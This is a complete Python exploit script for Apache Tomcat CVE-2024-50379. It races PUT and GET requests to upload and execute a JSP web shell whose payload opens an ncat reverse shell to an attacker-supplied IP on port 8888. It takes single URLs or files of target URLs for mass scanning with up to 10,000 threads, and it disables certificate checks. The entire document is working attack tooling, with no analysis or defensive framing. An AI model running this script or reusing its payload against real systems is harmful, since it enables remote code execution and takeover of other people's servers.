import requests
import urllib3
import argparse
import ssl
import concurrent.futures
from urllib.parse import urljoin

# SSL settings
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants
MAX_WORKERS = 10000
TIMEOUT = 4

# Dynamic payload template (keep your format exact)
PAYLOAD_TEMPLATE = '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec("cmd /c start ncat -e cmd.exe CONNECTION_IP 8888"); %>'

def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

def build_payload(ip):
    """Inject the provided IP into the payload."""
    return PAYLOAD_TEMPLATE.replace("CONNECTION_IP", ip)

def check(url, connection_ip, loop_count):
    """Main check function to send PUT/GET in race condition."""
    protocols = ['http://', 'https://']
    found_vulnerabilities = False

    for protocol in protocols:
        target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
        print(f"[*] Checking {target_url}")

        # Define targets
        target_url_put1 = urljoin(target_url, "/aa.Jsp")
        target_url_put2 = urljoin(target_url, "/bb.Jsp")
        target_url_get1 = urljoin(target_url, "/aa.jsp")
        target_url_get2 = urljoin(target_url, "/bb.jsp")

        # Define headers
        headers_put = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Content-Type": "application/json"
        }

        headers_get = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
        }

        payload_put = build_payload(connection_ip)

        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []

            # Race loop - SEND 4 requests per loop
            for _ in range(loop_count):
                futures.append(executor.submit(requests.put, target_url_put1, headers=headers_put, data=payload_put, verify=False, timeout=TIMEOUT))
                futures.append(executor.submit(requests.put, target_url_put2, headers=headers_put, data=payload_put, verify=False, timeout=TIMEOUT))
                futures.append(executor.submit(requests.get, target_url_get1, headers=headers_get, verify=False, timeout=TIMEOUT))
                futures.append(executor.submit(requests.get, target_url_get2, headers=headers_get, verify=False, timeout=TIMEOUT))

            for future in concurrent.futures.as_completed(futures):
                try:
                    response = future.result()
                    if isinstance(response, requests.Response):
                        print(f"Response status: {response.status_code}")
                        if response.status_code in (200, 201):
                            found_vulnerabilities = True
                except Exception as e:
                    print(f"[!] Error occurred: {e}")

        if found_vulnerabilities:
            print(f"\033[91m[!!!] Race condition exploited: {url}\033[0m")
            return True
        else:
            print(f"[-] No success at {url}")

def main():
    parser = argparse.ArgumentParser(description="Apache Tomcat CVE-2024-50379 Race Exploit with Reverse Shell Payload")
    parser.add_argument("-u", "--url", help="Single target URL (e.g., http://ip:port)")
    parser.add_argument("-f", "--txt", help="File containing target URLs")
    parser.add_argument("-ip", "--connectip", required=True, help="Your attack machine IP (for reverse shell)")
    parser.add_argument("-n", "--loops", type=int, default=2000, help="Number of loop cycles (default: 2000)")
    args = parser.parse_args()

    url = args.url
    txt = args.txt
    connection_ip = args.connectip
    loop_count = args.loops

    if url:
        check(url, connection_ip, loop_count)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url, connection_ip, loop_count)
    else:
        print("Please provide either a URL (-u) or a file (-f)")

if __name__ == "__main__":
    main()
